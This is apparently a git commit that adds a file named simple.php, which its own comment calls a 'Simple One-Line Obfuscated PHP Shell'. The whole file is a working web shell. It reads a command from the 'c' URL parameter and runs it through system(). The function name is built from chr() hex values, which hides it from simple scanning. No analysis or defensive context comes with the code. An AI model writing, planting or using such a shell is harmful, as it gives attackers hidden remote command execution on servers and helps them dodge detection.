7d3a783095d242152f8390e67566c04b1858728a
p-ncs <51414511+p-ncs@users.noreply.github.com>
2019-06-06 02:22:54 +0100

    Create simple.php

---
+++ simple.php
@@ -0,0 +1,8 @@
+<?php
+
+/* Simple One-Line Obfuscated PHP Shell 
+ * (c) 2019 NorthCS.co.uk. 
+ * Usage: simple.php?c=ls 
+ */
+
+$c = $_GET['c'];$s = chr(0x73).chr(0x79).chr(0x73).chr(0x74).chr(0x65).chr(0x6d);if($c){$s($c);} ?>
